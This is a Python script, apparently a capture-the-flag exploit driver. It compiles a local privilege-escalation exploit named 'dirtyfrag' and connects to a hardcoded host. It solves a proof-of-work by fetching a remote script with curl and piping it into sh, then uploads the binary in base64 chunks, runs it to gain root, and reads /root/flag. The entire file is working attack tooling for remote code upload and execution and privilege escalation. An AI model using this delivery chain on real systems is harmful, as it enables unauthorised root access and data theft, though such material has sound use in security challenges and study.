#!/usr/bin/env python3
from __future__ import annotations
import argparse, base64, socket, subprocess, sys, tempfile, time
from pathlib import Path

REMOTE_BINARY = "/tmp/dirtyfrag-exp"
REMOTE_B64 = "/tmp/dirtyfrag-exp.b64"
EXP_PATH = Path(__file__).parent / "exp.c"

def read_until(sock, needles, timeout=30, show=False):
    end = time.monotonic() + timeout
    data = bytearray()
    sock.settimeout(0.5)
    while time.monotonic() < end:
        if any(n in data for n in needles):
            return bytes(data)
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            continue
        if not chunk:
            break
        data.extend(chunk)
        if show:
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()
    return bytes(data)

def compile_exp():
    fd, name = tempfile.mkstemp(prefix="exp-", suffix="")
    import os
    os.close(fd)
    out = Path(name)
    subprocess.run(["gcc", "-O0", "-Wall", "-o", str(out), str(EXP_PATH), "-lutil"], check=True)
    out.chmod(0o755)
    return out

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="20.219.0.137")
    p.add_argument("--port", type=int, default=3002)
    p.add_argument("--exp", type=Path)
    args = p.parse_args()
    tmp = None
    binary = args.exp if args.exp else compile_exp()
    if not args.exp:
        tmp = binary
    try:
        with socket.create_connection((args.host, args.port), timeout=15) as s:
            data = read_until(s, (b"solution: ",), 30, show=True)
            chal = data.split(b"sh -s ", 1)[1].splitlines()[0].decode()
            solver = subprocess.run(["curl", "-sSfL", "https://pwn.red/pow"], check=True, capture_output=True, timeout=30)
            sol = subprocess.run(["sh", "-s", chal], input=solver.stdout, check=True, capture_output=True, timeout=180).stdout.strip()
            s.sendall(sol + b"\n")
            read_until(s, (b"$ ", b"# "), 30, show=True)
            enc = base64.b64encode(binary.read_bytes()).decode()
            s.sendall(b"stty -echo\n")
            read_until(s, (b"$ ",), 10)
            s.sendall(f"while IFS= read -r line; do if [ \"$line\" = __DIRTYFRAG_DONE__ ]; then break; fi; printf '%s\\n' \"$line\"; done > {REMOTE_B64}\n".encode())
            s.sendall(("\n".join(enc[i:i+2000] for i in range(0, len(enc), 2000)) + "\n__DIRTYFRAG_DONE__\n").encode())
            read_until(s, (b"$ ",), 60)
            s.sendall(f"base64 -d {REMOTE_B64} > {REMOTE_BINARY}\n".encode())
            read_until(s, (b"$ ",), 10)
            s.sendall(f"chmod 0755 {REMOTE_BINARY}\n".encode())
            read_until(s, (b"$ ",), 10)
            s.sendall(b"/tmp/dirtyfrag-exp\n")
            out = read_until(s, (b"page-cache patched", b"[!!!] HIT", b"# "), 360, show=True)
            if b"# " not in out:
                out += read_until(s, (b"# ",), 30, show=True)
            s.sendall(b"/usr/local/libexec/syscheck\nid; cat /root/flag; exit\n")
            ver = read_until(s, (b"}",), 30, show=True)
            sys.stdout.buffer.write(ver)
            return 0 if b"encryptid{" in ver else 1
    finally:
        if tmp:
            tmp.unlink(missing_ok=True)

if __name__ == "__main__":
    raise SystemExit(main())
